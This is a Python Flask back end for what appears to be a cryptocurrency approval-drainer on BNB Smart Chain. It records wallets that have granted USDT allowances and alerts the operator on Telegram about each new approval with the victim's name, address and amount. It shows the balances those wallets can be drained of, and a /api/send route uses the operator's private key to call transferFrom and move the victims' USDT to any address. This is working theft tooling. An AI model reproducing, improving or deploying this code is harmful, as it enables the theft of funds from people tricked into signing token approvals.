import os
import sqlite3
import datetime
from dotenv import load_dotenv
from flask import Flask, render_template, request, jsonify, session
from web3 import Web3
import requests

load_dotenv()
app = Flask(__name__)
app.secret_key = os.urandom(24)

# ======================== BSC Setup ========================
BSC_RPC_URL = os.getenv("BSC_RPC_URL")
USDT_CONTRACT = os.getenv("USDT_CONTRACT")
CHAIN_ID = int(os.getenv("CHAIN_ID", 56))

w3 = Web3(Web3.HTTPProvider(BSC_RPC_URL))

USDT_ABI = '''
[
    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
]
'''

usdt = w3.eth.contract(address=Web3.to_checksum_address(USDT_CONTRACT), abi=USDT_ABI)

# Wallet की Private Key (जो .env में डाली है)
PRIVATE_KEY = os.getenv("PRIVATE_KEY")
sender = w3.eth.account.from_key(PRIVATE_KEY) if PRIVATE_KEY else None

# Telegram
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")

# ======================== Database ========================
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS wallets (id INTEGER PRIMARY KEY, name TEXT, address TEXT, allowance REAL)''')
    c.execute('''CREATE TABLE IF NOT EXISTS history (id INTEGER PRIMARY KEY, from_name TEXT, to_address TEXT, amount REAL, status TEXT, tx_hash TEXT, time TEXT)''')
    conn.commit()
    conn.close()

init_db()

def get_usdt_balance(address):
    try:
        checksum_addr = Web3.to_checksum_address(address)
        balance = usdt.functions.balanceOf(checksum_addr).call()
        return balance / 10**18
    except:
        return 0

def send_telegram(msg):
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
    except:
        pass

# ======================== Routes ========================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/admin')
def admin():
    return render_template('admin.html')

@app.route('/api/notify', methods=['POST'])
def notify():
    data = request.json
    msg = f"✅ New USDT Approval!\n📛 Name: {data['name']}\n🔑 Address: {data['address']}\n💰 Amount: {data['amount']} USDT"
    send_telegram(msg)
    return jsonify({'ok': True})

@app.route('/api/login', methods=['POST'])
def login():
    if request.json.get('password') == ADMIN_PASSWORD:
        session['admin'] = True
        return jsonify({'success': True})
    return jsonify({'success': False})

@app.route('/api/logout')
def logout():
    session.pop('admin', None)
    return jsonify({'success': True})

@app.route('/api/wallets')
def wallets():
    if 'admin' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT id, name, address, allowance FROM wallets")
    wallets = []
    for r in c.fetchall():
        wallets.append({
            'id': r[0], 'name': r[1], 'address': r[2][:10]+'...', 'full_address': r[2],
            'allowance': r[3], 'balance': get_usdt_balance(r[2])
        })
    conn.close()
    return jsonify(wallets)

@app.route('/api/add_wallet', methods=['POST'])
def add_wallet():
    if 'admin' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    data = request.json
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("INSERT INTO wallets (name, address, allowance) VALUES (?, ?, ?)",
              (data['name'], data['address'], data.get('allowance', 1000000)))
    conn.commit()
    conn.close()
    send_telegram(f"➕ New wallet added: {data['name']}")
    return jsonify({'success': True})

@app.route('/api/send', methods=['POST'])
def send():
    if 'admin' not in session or not sender:
        return jsonify({'error': 'Unauthorized'}), 401
    data = request.json
    try:
        amount_wei = int(float(data['amount']) * 10**18)
        
        tx = usdt.functions.transferFrom(
            Web3.to_checksum_address(data['from_address']),
            Web3.to_checksum_address(data['to_address']),
            amount_wei
        ).build_transaction({
            'from': sender.address,
            'gas': 150000,
            'gasPrice': w3.eth.gas_price,
            'nonce': w3.eth.get_transaction_count(sender.address),
            'chainId': CHAIN_ID
        })
        
        signed = sender.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction).hex()
        
        send_telegram(f"💸 Transfer: {data['amount']} USDT from {data['from_name']} to {data['to_address'][:10]}...\n🔗 https://bscscan.com/tx/{tx_hash}")
        
        return jsonify({'success': True, 'tx_hash': tx_hash})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
